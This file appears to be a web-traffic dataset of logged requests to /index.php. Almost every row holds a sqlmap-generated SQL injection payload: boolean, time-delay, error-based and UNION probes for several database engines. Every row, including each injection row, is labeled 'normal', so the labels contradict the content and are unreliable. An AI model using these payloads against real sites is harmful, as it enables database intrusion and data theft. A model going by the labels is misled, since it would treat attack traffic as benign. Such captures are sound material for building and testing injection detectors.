/,,*/* close,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","(select concat(0x716b716a71,(select (elt(8802=8802,1))),0x7171717671))",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",(select (chr(113)||chr(107)||chr(113)||chr(106)||chr(113))||(select (case when (1497=1497) then 1 else 0 end))::text||(chr(113)||chr(113)||chr(113)||chr(118)||chr(113))),normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",(select char(113) char(107) char(113) char(106) char(113) (select (case when (2920=2920) then char(49) else char(48) end)) char(113) char(113) char(113) char(118) char(113)),normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs'),normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs',normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs),normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs'),normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs',normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs%',normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs),normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs' and sleep(5) and 'uzhp'='uzhp,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs) and sleep(5) and (3996=3996,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs and sleep(5)-- xyuv,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs') and 8884=(select 8884 from pg_sleep(5)) and ('wmtw'='wmtw,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs' and 8884=(select 8884 from pg_sleep(5)) and 'ltsy'='ltsy,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs') waitfor delay '0:0:5' and ('saqt'='saqt,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs' waitfor delay '0:0:5' and 'mmwd'='mmwd,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs) waitfor delay '0:0:5' and (5707=5707,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs') and 2136=dbms_pipe.receive_message(chr(105)||chr(110)||chr(69)||chr(83),5) and ('qkzt'='qkzt",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs and 2136=dbms_pipe.receive_message(chr(105)||chr(110)||chr(69)||chr(83),5)",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs') order by 1-- urmf,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs') union all select null-- ittf,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs') union all select null,null,null,null-- ehpq",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs') union all select null,null,null,null,null-- jiaq",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs') union all select null,null,null,null,null,null,null-- wuix",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs') union all select null,null,null,null,null,null,null,null,null-- tnpx",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs' order by 1-- wdqt,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs' union all select null-- bpgf,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs' union all select null,null,null-- ddwq",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs' union all select null,null,null,null,null-- neau",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs' union all select null,null,null,null,null,null,null-- iirk",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs' union all select null,null,null,null,null,null,null,null,null-- eqky",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs%' order by 11-- qfvt,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs%' union all select null,null,null,null-- gmjc",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs%' union all select null,null,null,null,null-- eanx",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs%' union all select null,null,null,null,null,null,null-- quqi",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs) order by 1-- zbwc,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs) order by 11-- cqqd,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs) union all select null,null,null-- efgs",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs) union all select null,null,null,null-- bdpo",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs) union all select null,null,null,null,null-- nvga",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs) union all select null,null,null,null,null,null,null-- jdmy",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs) union all select null,null,null,null,null,null,null,null,null-- wepw",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs order by 11-- uxtg,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs union all select null-- rldo,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs union all select null,null,null-- lljw",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs union all select null,null,null,null-- hxmb",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs union all select null,null,null,null,null,null-- xfqk",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs union all select null,null,null,null,null,null,null-- sybi",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs union all select null,null,null,null,null,null,null,null,null-- xqjf",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs union all select null,null,null,null,null,null,null,null,null,null-- tvga",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs union all select null,null-- ynqt",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs union all select null,null,null,null,null,null-- tjlz",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs union all select null,null,null,null,null,null,null,null-- bane",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs union all select null,null,null,null,null,null,null,null,null,null-- ipqc",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",6606,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs,',)..."".)",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs'xryvmq<'"">nckuji",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs') and 1284=2975 and ('reho'='reho,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs') and 9304=9304 and ('skfz'='skfz,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs' and 2088=2506 and 'drxv'='drxv,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs' and 9304=9304 and 'pxhb'='pxhb,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs%' and 8208=1069 and '%'=',normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs%' and 9304=9304 and '%'=',normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs) and 5560=8400 and (7701=7701,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs) and 9304=9304 and (2916=2916,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs and 4563=4307,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs and 9304=9304,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs and 3442=4427-- grys,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs and 9304=9304-- qhmu,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",(select (case when (6865=7009) then 6865 else 6865*(select 6865 from information_schema.plugins) end)),normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",(select (case when (2800=2800) then 2800 else 2800*(select 2800 from information_schema.plugins) end)),normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs') and (select 5177 from(select count(*),concat(0x716b707a71,(select (elt(5177=5177,1))),0x71786a7171,floor(rand(0)*2))x from information_schema.plugins group by x)a) and ('mjls'='mjls",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs' and (select 5177 from(select count(*),concat(0x716b707a71,(select (elt(5177=5177,1))),0x71786a7171,floor(rand(0)*2))x from information_schema.plugins group by x)a) and 'wfoq'='wfoq",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs%' and (select 5177 from(select count(*),concat(0x716b707a71,(select (elt(5177=5177,1))),0x71786a7171,floor(rand(0)*2))x from information_schema.plugins group by x)a) and '%'='",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs) and (select 5177 from(select count(*),concat(0x716b707a71,(select (elt(5177=5177,1))),0x71786a7171,floor(rand(0)*2))x from information_schema.plugins group by x)a) and (7827=7827",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs and (select 5177 from(select count(*),concat(0x716b707a71,(select (elt(5177=5177,1))),0x71786a7171,floor(rand(0)*2))x from information_schema.plugins group by x)a)",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs and (select 5177 from(select count(*),concat(0x716b707a71,(select (elt(5177=5177,1))),0x71786a7171,floor(rand(0)*2))x from information_schema.plugins group by x)a)-- suie",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs') and 2073=cast((chr(113)||chr(107)||chr(112)||chr(122)||chr(113))||(select (case when (2073=2073) then 1 else 0 end))::text||(chr(113)||chr(120)||chr(106)||chr(113)||chr(113)) as numeric) and ('pztp'='pztp,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs' and 2073=cast((chr(113)||chr(107)||chr(112)||chr(122)||chr(113))||(select (case when (2073=2073) then 1 else 0 end))::text||(chr(113)||chr(120)||chr(106)||chr(113)||chr(113)) as numeric) and 'vjpm'='vjpm,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs%' and 2073=cast((chr(113)||chr(107)||chr(112)||chr(122)||chr(113))||(select (case when (2073=2073) then 1 else 0 end))::text||(chr(113)||chr(120)||chr(106)||chr(113)||chr(113)) as numeric) and '%'=',normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs) and 2073=cast((chr(113)||chr(107)||chr(112)||chr(122)||chr(113))||(select (case when (2073=2073) then 1 else 0 end))::text||(chr(113)||chr(120)||chr(106)||chr(113)||chr(113)) as numeric) and (7768=7768,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs and 2073=cast((chr(113)||chr(107)||chr(112)||chr(122)||chr(113))||(select (case when (2073=2073) then 1 else 0 end))::text||(chr(113)||chr(120)||chr(106)||chr(113)||chr(113)) as numeric),normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs and 2073=cast((chr(113)||chr(107)||chr(112)||chr(122)||chr(113))||(select (case when (2073=2073) then 1 else 0 end))::text||(chr(113)||chr(120)||chr(106)||chr(113)||chr(113)) as numeric)-- mugq,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs') and 3431 in (select (char(113) char(107) char(112) char(122) char(113) (select (case when (3431=3431) then char(49) else char(48) end)) char(113) char(120) char(106) char(113) char(113))) and ('bdnw'='bdnw,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs' and 3431 in (select (char(113) char(107) char(112) char(122) char(113) (select (case when (3431=3431) then char(49) else char(48) end)) char(113) char(120) char(106) char(113) char(113))) and 'hvjm'='hvjm,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs%' and 3431 in (select (char(113) char(107) char(112) char(122) char(113) (select (case when (3431=3431) then char(49) else char(48) end)) char(113) char(120) char(106) char(113) char(113))) and '%'=',normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs) and 3431 in (select (char(113) char(107) char(112) char(122) char(113) (select (case when (3431=3431) then char(49) else char(48) end)) char(113) char(120) char(106) char(113) char(113))) and (8741=8741,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs and 3431 in (select (char(113) char(107) char(112) char(122) char(113) (select (case when (3431=3431) then char(49) else char(48) end)) char(113) char(120) char(106) char(113) char(113))),normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs and 3431 in (select (char(113) char(107) char(112) char(122) char(113) (select (case when (3431=3431) then char(49) else char(48) end)) char(113) char(120) char(106) char(113) char(113)))-- iqsp,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs') and 9106=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(107)||chr(112)||chr(122)||chr(113)||(select (case when (9106=9106) then 1 else 0 end) from dual)||chr(113)||chr(120)||chr(106)||chr(113)||chr(113)||chr(62))) from dual) and ('rnfl'='rnfl,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs' and 9106=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(107)||chr(112)||chr(122)||chr(113)||(select (case when (9106=9106) then 1 else 0 end) from dual)||chr(113)||chr(120)||chr(106)||chr(113)||chr(113)||chr(62))) from dual) and 'wxey'='wxey,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs%' and 9106=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(107)||chr(112)||chr(122)||chr(113)||(select (case when (9106=9106) then 1 else 0 end) from dual)||chr(113)||chr(120)||chr(106)||chr(113)||chr(113)||chr(62))) from dual) and '%'=',normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs) and 9106=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(107)||chr(112)||chr(122)||chr(113)||(select (case when (9106=9106) then 1 else 0 end) from dual)||chr(113)||chr(120)||chr(106)||chr(113)||chr(113)||chr(62))) from dual) and (2845=2845,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs and 9106=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(107)||chr(112)||chr(122)||chr(113)||(select (case when (9106=9106) then 1 else 0 end) from dual)||chr(113)||chr(120)||chr(106)||chr(113)||chr(113)||chr(62))) from dual),normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs and 9106=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(107)||chr(112)||chr(122)||chr(113)||(select (case when (9106=9106) then 1 else 0 end) from dual)||chr(113)||chr(120)||chr(106)||chr(113)||chr(113)||chr(62))) from dual)-- toar,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","(select 6088 from(select count(*),concat(0x716b707a71,(select (elt(6088=6088,1))),0x71786a7171,floor(rand(0)*2))x from information_schema.plugins group by x)a)",normal
